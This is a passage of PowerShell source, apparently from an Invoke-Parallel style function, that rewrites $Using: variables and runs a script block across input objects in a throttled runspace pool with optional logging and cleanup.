                if($PSVersionTable.PSVersion.Major -gt 2) {
                    #Extract using references
                    $UsingVariables = $ScriptBlock.ast.FindAll({$args[0] -is [System.Management.Automation.Language.UsingExpressionAst]},$True)

                    If ($UsingVariables) {
                        $List = New-Object 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                        ForEach ($Ast in $UsingVariables) {
                            [void]$list.Add($Ast.SubExpression)
                        }

                        $UsingVar = $UsingVariables | Group-Object -Property SubExpression | ForEach-Object {$_.Group | Select-Object -First 1}

                        #Extract the name, value, and create replacements for each
                        $UsingVariableData = ForEach ($Var in $UsingVar) {
                            try {
                                $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                                [pscustomobject]@{
                                    Name = $Var.SubExpression.Extent.Text
                                    Value = $Value.Value
                                    NewName = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                }
                            }
                            catch {
                                Write-Error "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                            }
                        }
                        $ParamsToAdd += $UsingVariableData | Select-Object -ExpandProperty NewName -Unique

                        $NewParams = $UsingVariableData.NewName -join ', '
                        $Tuple = [Tuple]::Create($list, $NewParams)
                        $bindingFlags = [Reflection.BindingFlags]"Default,NonPublic,Instance"
                        $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))

                        $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                        $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                        Write-Verbose $StringScriptBlock
                    }
                }

                $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ", "))`r`n" + $Scriptblock.ToString())
            }
            else {
                Throw "Must provide ScriptBlock or ScriptFile"; Break
            }

            Write-Debug "`$ScriptBlock: $($ScriptBlock | Out-String)"
            Write-Verbose "Creating runspace pool and session states"

            #If specified, add variables and modules/snapins to session state
            $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
            if($ImportVariables -and $UserVariables.count -gt 0) {
                foreach($Variable in $UserVariables) {
                    $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
            if ($ImportModules) {
                if($UserModules.count -gt 0) {
                    foreach($ModulePath in $UserModules) {
                        $sessionstate.ImportPSModule($ModulePath)
                    }
                }
                if($UserSnapins.count -gt 0) {
                    foreach($PSSnapin in $UserSnapins) {
                        [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                    }
                }
            }
            if($ImportFunctions -and $UserFunctions.count -gt 0) {
                foreach ($FunctionDef in $UserFunctions) {
                    $sessionstate.Commands.Add((New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $FunctionDef.Name,$FunctionDef.ScriptBlock))
                }
            }

            #Create runspace pool
            $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
            $runspacepool.Open()

            Write-Verbose "Creating empty collection to hold runspace jobs"
            $Script:runspaces = New-Object System.Collections.ArrayList

            #If inputObject is bound get a total count and set bound to true
            $bound = $PSBoundParameters.keys -contains "InputObject"
            if(-not $bound) {
                [System.Collections.ArrayList]$allObjects = @()
            }

            #Set up log file if specified
            if( $LogFile -and (-not (Test-Path $LogFile) -or $AppendLog -eq $false)){
                New-Item -ItemType file -Path $logFile -Force | Out-Null
                ("" | Select-Object -Property Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
            }

            #write initial log entry
            $log = "" | Select-Object -Property Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                    ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }
            $timedOutTasks = $false
        #endregion INIT
    }
    process {
        #add piped objects to all objects or set all objects to bound input object parameter
        if($bound) {
            $allObjects = $InputObject
        }
        else {
            [void]$allObjects.add( $InputObject )
        }
    }
    end {
        #Use Try/Finally to catch Ctrl+C and clean up.
        try {
            #counts for progress
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0
            foreach($object in $allObjects) {
                #region add scripts to runspace pool
                    #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                    $powershell = [powershell]::Create()

                    if ($VerbosePreference -eq 'Continue') {
                        [void]$PowerShell.AddScript({$VerbosePreference = 'Continue'})
                    }

                    [void]$PowerShell.AddScript($ScriptBlock).AddArgument($object)

                    if ($parameter) {
                        [void]$PowerShell.AddArgument($parameter)
                    }

                    # $Using support from Boe Prox
                    if ($UsingVariableData) {
                        Foreach($UsingVariable in $UsingVariableData) {
                            #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                            [void]$PowerShell.AddArgument($UsingVariable.Value)
                        }
                    }

                    #Add the runspace into the powershell instance
                    $powershell.RunspacePool = $runspacepool

                    #Create a temporary collection for each runspace
                    $temp = "" | Select-Object PowerShell, StartTime, object, Runspace
                    $temp.PowerShell = $powershell
                    $temp.StartTime = Get-Date
                    $temp.object = $object

                    #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                    $temp.Runspace = $powershell.BeginInvoke()
                    $startedCount++

                    #Add the temp tracking info to $runspaces collection
                    #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                    $runspaces.Add($temp) | Out-Null

                    #loop through existing runspaces one time
                    Get-RunspaceData

                    #If we have more running than max queue (used to control timeout accuracy)
                    #Script scope resolves odd PowerShell 2 issue
                    $firstRun = $true
                    while ($runspaces.count -ge $Script:MaxQueue) {
                        #give verbose output
                        if($firstRun) {
                            #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                        }
                        $firstRun = $false

                        #run get-runspace data and sleep for a short while
                        Get-RunspaceData
                        Start-Sleep -Milliseconds $sleepTimer
                    }
                #endregion add scripts to runspace pool
            }
            Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where-Object {$_.Runspace -ne $Null}).Count) )

            Get-RunspaceData -wait
            if (-not $quiet) {
                Write-Progress -Activity "Running Query" -Status "Starting threads" -Completed
            }
        }
        finally {
            #Close the runspace pool, unless we specified no close on timeout and something timed out
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($noCloseOnTimeout -eq $false) ) ) {
                Write-Verbose "Closing the runspace pool"
                $runspacepool.close()
            }
            #collect garbage
            [gc]::Collect()
        }
    }
}